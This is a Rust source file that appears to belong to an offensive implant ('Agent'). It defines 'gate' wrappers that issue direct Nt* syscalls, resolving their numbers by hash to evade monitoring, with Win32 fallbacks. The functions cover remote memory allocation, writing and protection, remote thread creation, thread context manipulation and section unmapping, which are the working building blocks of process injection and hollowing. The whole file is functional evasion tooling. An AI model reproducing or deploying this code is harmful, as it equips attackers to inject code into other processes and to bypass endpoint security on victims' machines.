// __NAME__ Agent — Gate Helper Functions
//
// Typed wrappers around EvasionGate::syscall() for Nt* calls.
// Each function resolves the SSN, invokes the gate, and returns a
// Win32-compatible result.  Falls back to the IAT path on resolution failure.

#![allow(dead_code)]

use super::RecycleGate;
use super::EvasionGate;
use super::hash::*;

// ── NtAllocateVirtualMemory (local) ──────────────────────────────────────────

pub unsafe fn gate_alloc(
    gate: &RecycleGate,
    addr: *const u8,
    size: usize,
    alloc_type: u32,
    protect: u32,
) -> *mut u8 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_ALLOCATE_VM) {
        let mut base = addr as usize;
        let mut sz = size;
        let status = gate.syscall(ssn, &[
            usize::MAX,
            &mut base as *mut _ as usize,
            0,
            &mut sz as *mut _ as usize,
            alloc_type as usize,
            protect as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { base as *mut u8 } else { core::ptr::null_mut() }
    } else {
        crate::iat::VirtualAlloc(addr, size, alloc_type, protect)
    }
}

// ── NtAllocateVirtualMemory (remote) ─────────────────────────────────────────

pub unsafe fn gate_alloc_ex(
    gate: &RecycleGate,
    h_process: isize,
    addr: *const u8,
    size: usize,
    alloc_type: u32,
    protect: u32,
) -> *mut u8 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_ALLOCATE_VM) {
        let mut base = addr as usize;
        let mut sz = size;
        let status = gate.syscall(ssn, &[
            h_process as usize,
            &mut base as *mut _ as usize,
            0,
            &mut sz as *mut _ as usize,
            alloc_type as usize,
            protect as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { base as *mut u8 } else { core::ptr::null_mut() }
    } else {
        crate::iat::VirtualAllocEx(h_process, addr, size, alloc_type, protect)
    }
}

// ── NtProtectVirtualMemory (local) ───────────────────────────────────────────

pub unsafe fn gate_protect(
    gate: &RecycleGate,
    addr: *const u8,
    size: usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_PROTECT_VM) {
        let mut base = addr as usize;
        let mut sz = size;
        let status = gate.syscall(ssn, &[
            usize::MAX,
            &mut base as *mut _ as usize,
            &mut sz as *mut _ as usize,
            new_protect as usize,
            old_protect as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::VirtualProtect(addr, size, new_protect, old_protect)
    }
}

// ── NtProtectVirtualMemory (remote) ──────────────────────────────────────────

pub unsafe fn gate_protect_ex(
    gate: &RecycleGate,
    h_process: isize,
    addr: *const u8,
    size: usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_PROTECT_VM) {
        let mut base = addr as usize;
        let mut sz = size;
        let status = gate.syscall(ssn, &[
            h_process as usize,
            &mut base as *mut _ as usize,
            &mut sz as *mut _ as usize,
            new_protect as usize,
            old_protect as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::VirtualProtectEx(h_process, addr, size, new_protect, old_protect)
    }
}

// ── NtFreeVirtualMemory ──────────────────────────────────────────────────────

pub unsafe fn gate_free(
    gate: &RecycleGate,
    addr: *mut u8,
    size: usize,
    free_type: u32,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_FREE_VM) {
        let mut base = addr as usize;
        let mut sz = size;
        let status = gate.syscall(ssn, &[
            usize::MAX,
            &mut base as *mut _ as usize,
            &mut sz as *mut _ as usize,
            free_type as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::VirtualFree(addr, size, free_type)
    }
}

// ── NtWriteVirtualMemory ─────────────────────────────────────────────────────

pub unsafe fn gate_write_process_memory(
    gate: &RecycleGate,
    h_process: isize,
    base_addr: *mut u8,
    buffer: *const u8,
    size: usize,
    bytes_written: *mut usize,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_WRITE_VM) {
        let status = gate.syscall(ssn, &[
            h_process as usize,
            base_addr as usize,
            buffer as usize,
            size,
            bytes_written as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::WriteProcessMemory(h_process, base_addr, buffer, size, bytes_written)
    }
}

// ── NtReadVirtualMemory ──────────────────────────────────────────────────────

pub unsafe fn gate_read_process_memory(
    gate: &RecycleGate,
    h_process: isize,
    base_addr: *const u8,
    buffer: *mut u8,
    size: usize,
    bytes_read: *mut usize,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_READ_VM) {
        let status = gate.syscall(ssn, &[
            h_process as usize,
            base_addr as usize,
            buffer as usize,
            size,
            bytes_read as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::ReadProcessMemory(h_process, base_addr, buffer, size, bytes_read)
    }
}

// ── NtOpenProcess ────────────────────────────────────────────────────────────

pub unsafe fn gate_open_process(
    gate: &RecycleGate,
    desired_access: u32,
    pid: u32,
) -> isize {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_OPEN_PROCESS) {
        let mut handle: isize = 0;

        // Minimal OBJECT_ATTRIBUTES (48 bytes on x64, Length at offset 0)
        let mut oa = [0u8; 48];
        let oa_len: u32 = 48;
        core::ptr::copy_nonoverlapping(
            &oa_len as *const u32 as *const u8,
            oa.as_mut_ptr(),
            4,
        );

        // CLIENT_ID { UniqueProcess: HANDLE, UniqueThread: HANDLE }
        let mut cid = [0u8; 16];
        let pid_usize = pid as usize;
        core::ptr::copy_nonoverlapping(
            &pid_usize as *const usize as *const u8,
            cid.as_mut_ptr(),
            8,
        );

        let status = gate.syscall(ssn, &[
            &mut handle as *mut isize as usize,
            desired_access as usize,
            oa.as_ptr() as usize,
            cid.as_ptr() as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { handle } else { 0 }
    } else {
        crate::iat::OpenProcess(desired_access, 0, pid)
    }
}

// ── NtClose ──────────────────────────────────────────────────────────────────

pub unsafe fn gate_close(gate: &RecycleGate, handle: isize) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_CLOSE) {
        let status = gate.syscall(ssn, &[handle as usize]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::CloseHandle(handle)
    }
}

// ── NtResumeThread ───────────────────────────────────────────────────────────

pub unsafe fn gate_resume_thread(gate: &RecycleGate, h_thread: isize) -> u32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_RESUME_THREAD) {
        let mut prev_count: u32 = 0;
        gate.syscall(ssn, &[
            h_thread as usize,
            &mut prev_count as *mut u32 as usize,
        ]).unwrap_or(0xC0000001);
        prev_count
    } else {
        crate::iat::ResumeThread(h_thread)
    }
}

// ── NtSuspendThread ──────────────────────────────────────────────────────────

pub unsafe fn gate_suspend_thread(gate: &RecycleGate, h_thread: isize) -> u32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_SUSPEND_THREAD) {
        let mut prev_count: u32 = 0;
        gate.syscall(ssn, &[
            h_thread as usize,
            &mut prev_count as *mut u32 as usize,
        ]).unwrap_or(0xC0000001);
        prev_count
    } else {
        // No direct IAT fallback for SuspendThread; return 0
        0
    }
}

// ── NtCreateThreadEx (remote or local) ───────────────────────────────────────

pub unsafe fn gate_create_remote_thread(
    gate: &RecycleGate,
    h_process: isize,
    start_addr: usize,
    parameter: usize,
) -> isize {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_CREATE_THREAD_EX) {
        let mut h_thread: isize = 0;
        let status = gate.syscall(ssn, &[
            &mut h_thread as *mut isize as usize,
            0x1FFFFF,  // THREAD_ALL_ACCESS
            0,
            h_process as usize,
            start_addr,
            parameter,
            0, 0, 0, 0, 0,
        ]).unwrap_or(0xC0000001);
        if status == 0 { h_thread } else { 0 }
    } else {
        crate::iat::CreateRemoteThread(
            h_process,
            core::ptr::null(),
            0,
            start_addr,
            parameter as *mut u8,
            0,
            core::ptr::null_mut(),
        )
    }
}

// ── NtCreateThreadEx (local process, for CreateThread replacement) ───────────

pub unsafe fn gate_create_thread(
    gate: &RecycleGate,
    start_addr: usize,
    parameter: usize,
) -> isize {
    gate_create_remote_thread(gate, usize::MAX as isize, start_addr, parameter)
}

// ── NtWaitForSingleObject ────────────────────────────────────────────────────

pub unsafe fn gate_wait_for_single_object(
    gate: &RecycleGate,
    handle: isize,
    milliseconds: u32,
) -> u32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_WAIT_FOR_SINGLE_OBJECT) {
        #[allow(unused_assignments)]
        let mut timeout: i64 = 0;
        let p_timeout = if milliseconds == 0xFFFFFFFF {
            core::ptr::null::<i64>() as usize
        } else {
            timeout = -(milliseconds as i64) * 10_000;
            &timeout as *const i64 as usize
        };
        let status = gate.syscall(ssn, &[
            handle as usize,
            0, // Alertable = FALSE
            p_timeout,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 0 }           // WAIT_OBJECT_0
        else if status == 0x102 { 258 } // WAIT_TIMEOUT
        else { 0xFFFFFFFF }             // WAIT_FAILED
    } else {
        crate::iat::WaitForSingleObject(handle, milliseconds)
    }
}

// ── NtTerminateProcess ───────────────────────────────────────────────────────

pub unsafe fn gate_terminate_process(
    gate: &RecycleGate,
    h_process: isize,
    exit_code: u32,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_TERMINATE_PROCESS) {
        let status = gate.syscall(ssn, &[
            h_process as usize,
            exit_code as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::TerminateProcess(h_process, exit_code)
    }
}

// ── NtGetContextThread ───────────────────────────────────────────────────────

pub unsafe fn gate_get_thread_context(
    gate: &RecycleGate,
    h_thread: isize,
    context: *mut u8,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_GET_CONTEXT_THREAD) {
        let status = gate.syscall(ssn, &[
            h_thread as usize,
            context as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::GetThreadContext(h_thread, context)
    }
}

// ── NtSetContextThread ───────────────────────────────────────────────────────

pub unsafe fn gate_set_thread_context(
    gate: &RecycleGate,
    h_thread: isize,
    context: *const u8,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_SET_CONTEXT_THREAD) {
        let status = gate.syscall(ssn, &[
            h_thread as usize,
            context as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::SetThreadContext(h_thread, context)
    }
}

// ── NtOpenThread ─────────────────────────────────────────────────────────────

pub unsafe fn gate_open_thread(
    gate: &RecycleGate,
    desired_access: u32,
    _inherit_handle: i32,
    thread_id: u32,
) -> isize {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_OPEN_THREAD) {
        let mut h_thread: isize = 0;
        #[repr(C)]
        struct ObjAttr { len: u32, root: usize, name: usize, attr: u32, sd: usize, sqos: usize }
        let oa = ObjAttr { len: core::mem::size_of::<ObjAttr>() as u32, root: 0, name: 0, attr: 0, sd: 0, sqos: 0 };
        #[repr(C)]
        struct ClientId { process: usize, thread: usize }
        let cid = ClientId { process: 0, thread: thread_id as usize };
        let status = gate.syscall(ssn, &[
            &mut h_thread as *mut isize as usize,
            desired_access as usize,
            &oa as *const _ as usize,
            &cid as *const _ as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { h_thread } else { 0 }
    } else {
        crate::iat::OpenThread(desired_access, _inherit_handle, thread_id)
    }
}

// ── NtUnmapViewOfSection ─────────────────────────────────────────────────────

pub unsafe fn gate_unmap_view_of_file(
    gate: &RecycleGate,
    base_address: *const u8,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_UNMAP_VIEW_OF_SECTION) {
        let status = gate.syscall(ssn, &[
            usize::MAX,
            base_address as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::UnmapViewOfFile(base_address)
    }
}

// ── NtQueryVirtualMemory ─────────────────────────────────────────────────────

pub unsafe fn gate_query_virtual_memory(
    gate: &RecycleGate,
    address: *const u8,
    buffer: *mut u8,
    length: usize,
) -> usize {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_QUERY_VM) {
        let mut ret_len: usize = 0;
        let status = gate.syscall(ssn, &[
            usize::MAX,
            address as usize,
            0, // MemoryBasicInformation
            buffer as usize,
            length,
            &mut ret_len as *mut usize as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { ret_len } else { 0 }
    } else {
        crate::iat::VirtualQuery(address, buffer, length)
    }
}

// ── NtDuplicateObject ────────────────────────────────────────────────────────

pub unsafe fn gate_duplicate_handle(
    gate: &RecycleGate,
    source_process: isize,
    source_handle: isize,
    target_process: isize,
    target_handle: *mut isize,
    access: u32,
    inherit: i32,
    options: u32,
) -> i32 {
    if let Some((ssn, _)) = gate.resolve_ssn(HASH_NT_DUPLICATE_OBJECT) {
        let nt_attrs = if inherit != 0 { 2u32 } else { 0u32 };
        let status = gate.syscall(ssn, &[
            source_process as usize,
            source_handle as usize,
            target_process as usize,
            target_handle as usize,
            access as usize,
            nt_attrs as usize,
            options as usize,
        ]).unwrap_or(0xC0000001);
        if status == 0 { 1 } else { 0 }
    } else {
        crate::iat::DuplicateHandle(
            source_process, source_handle,
            target_process, target_handle,
            access, inherit, options,
        )
    }
}
